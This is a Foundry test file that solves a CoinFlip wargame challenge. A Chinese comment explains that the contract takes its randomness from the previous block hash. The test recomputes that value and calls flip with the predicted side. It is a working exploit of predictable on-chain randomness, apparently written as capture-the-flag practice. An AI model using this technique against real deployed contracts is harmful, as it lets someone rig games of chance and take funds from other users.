pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/CoinFlip.sol";


/** 
 * 解题思路：这里的关键在于随机源的获取是错误的，只要按照相同的逻辑来生成随机数，那么就可以直接获得结果，每次就可以猜中
 */
contract CoinFlipHackTest is Test {
    CoinFlip public c;
    address hacker = address(98089898);
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    function setUp() public {
        c = new CoinFlip();
        vm.deal(hacker, 1 ether);
    }
    function testCoinFlip() public {
        vm.startPrank(hacker);
        vm.setBlockhash(block.number -1 , "111");
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        console.log("blockValue:");
        console.logUint(blockValue);
        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = c.flip(side);
        console.log("flip result:");
        console.logBool(isRight);
        vm.stopPrank();
    }
}